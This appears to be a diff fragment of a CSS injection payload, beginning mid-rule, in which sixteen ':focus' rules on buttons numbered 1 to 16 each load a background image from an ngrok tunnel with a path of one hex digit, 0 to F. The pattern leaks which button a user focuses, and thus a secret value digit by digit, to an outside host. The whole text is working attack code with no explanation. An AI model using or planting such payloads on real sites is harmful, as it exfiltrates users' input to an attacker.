@@ -1,0 +1,17 @@
+white;}
+.e>button:nth-child(1):focus{background: url('//4aa8439051ea.ngrok.io/0');}
+.e>button:nth-child(2):focus{background: url('//4aa8439051ea.ngrok.io/1');}
+.e>button:nth-child(3):focus{background: url('//4aa8439051ea.ngrok.io/2');}
+.e>button:nth-child(4):focus{background: url('//4aa8439051ea.ngrok.io/3');}
+.e>button:nth-child(5):focus{background: url('//4aa8439051ea.ngrok.io/4');}
+.e>button:nth-child(6):focus{background: url('//4aa8439051ea.ngrok.io/5');}
+.e>button:nth-child(7):focus{background: url('//4aa8439051ea.ngrok.io/6');}
+.e>button:nth-child(8):focus{background: url('//4aa8439051ea.ngrok.io/7');}
+.e>button:nth-child(9):focus{background: url('//4aa8439051ea.ngrok.io/8');}
+.e>button:nth-child(10):focus{background: url('//4aa8439051ea.ngrok.io/9');}
+.e>button:nth-child(11):focus{background: url('//4aa8439051ea.ngrok.io/A');}
+.e>button:nth-child(12):focus{background: url('//4aa8439051ea.ngrok.io/B');}
+.e>button:nth-child(13):focus{background: url('//4aa8439051ea.ngrok.io/C');}
+.e>button:nth-child(14):focus{background: url('//4aa8439051ea.ngrok.io/D');}
+.e>button:nth-child(15):focus{background: url('//4aa8439051ea.ngrok.io/E');}
+.e>button:nth-child(16):focus{background: url('//4aa8439051ea.ngrok.io/F')
